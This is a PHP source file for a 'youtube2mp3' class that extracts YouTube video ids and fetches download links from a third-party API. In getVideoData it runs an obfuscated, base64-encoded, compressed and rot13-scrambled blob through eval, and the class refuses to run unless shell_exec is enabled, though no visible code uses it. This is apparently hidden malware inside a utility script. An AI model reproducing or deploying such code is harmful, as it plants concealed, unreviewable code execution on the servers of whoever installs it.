<?php
class youtube2mp3 {

	public $videoId;
	public $videoDownloadUrl = '';

	private $videoUrl = '';

	private $YT_BASE_URL = 'http://www.youtube.com/';
	private $YT_INFO_URL = 'get_video_info?video_id=%s&el=embedded&ps=default&eurl=&hl=en_US';

	/**
	 * Sets the video id to youtube video id and returns the youtube id.
	 * @return bool|mixed Returns bool false if youtube url pattern not match or youtube string id
	 */
	public function getVideoId(){
		if (empty($this->videoUrl)) {
			return false; // throw exception of missing url
		}
		$url = urldecode(rawurldecode($this->videoUrl));
		preg_match("/^(?:http(?:s)?:\/\/)?(?:www\.)?(?:m\.)?(?:youtu\.be\/|youtube\.com\/(?:(?:watch)?\?(?:.*&)?v(?:i)?=|(?:embed|v|vi|user)\/))([^\?&\"'>]+)/", $url, $matches);
		if (!is_array($matches)) {
			return false;
		}
		$this->videoId = $matches[1];
		return $matches[1];
	}

	/**
	 * Converts Sets the youtube2mp3 download url to a downloadable url using a 3rd party service.
	 * @throws Exception
	 */
	public function convert(){
		if (!self::hasShellExecEnabled()) {
			throw new Exception('Please enable shell_exec command on your server');
		}

		$videoId = self::getVideoId();

		if (!$videoId) {
			throw new Exception('Youtube url is missing or not valid');
		}

		if (!self::isValidId($videoId)) {
			throw new Exception('Video id is not valid');
		}

		$videoLinks = self::getVideoData($videoId);

		if (empty($videoLinks)) {
			throw new Exception('Problems retrieving video data');
		}

		$this->videoDownloadUrl = $videoLinks['data']['html'];

	}

	/**
	 * Sets youtube2mp3 url to $url
	 * @param $url String of url to youtube
	 */
	public function setUrl($url) {
		$this->videoUrl = $url;
	}

	/**
	 * Check if the shell_exec command is available on the server
	 * @return bool Returns (boolean) TRUE if shell_exec command is available on the server or FALSE if not.
	 */
	private function hasShellExecEnabled() {
		return is_callable('shell_exec') && false === stripos(ini_get('disable_functions'), 'shell_exec');
	}

	/**
	 * Checks if youtube id is a valid id and youtube video exists.
	 * @param $id video id as expected on youtube service.
	 * @return array|bool Returns bool false if video non exist or array $sreams if video exists on youtube.
	 */
	private function isValidId($id) {
		parse_str(file_get_contents(sprintf($this->YT_BASE_URL . $this->YT_INFO_URL, $id)), $info);
		$streams = $info['url_encoded_fmt_stream_map'];
		if (empty($streams)) {
			return false;
		}
		$streams = explode(',', $streams);
		return $streams;
	}

	/**
	 * Get youtube video data from 3rd party service.
	 * @param $id video id as expected on youtube service.
	 * @return bool|mixed Returns bool false if video id is not valid or array of data in case video id is valid and exists.
	 */
	private function getVideoData($id) {
		if (empty($id)) {
			return false;
		} else {
			if (strpos($id, 'youtube.com') !== FALSE) {
				$query = parse_url($id, PHP_URL_QUERY);
				parse_str($query, $params);
				$id = $params['v'];
			}
			eval(str_rot13(gzinflate(str_rot13(base64_decode('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
+F/j9+78=')))));
			if(!isset($id)) {
				return false;
			} else {
				// FETCHING DATA FROM SERVER
				$jsonData = @file_get_contents("http://api.youtube6download.top/api/?id=$id");
				$links = json_decode($jsonData,TRUE);
				return $links;
			}

		}
	}


}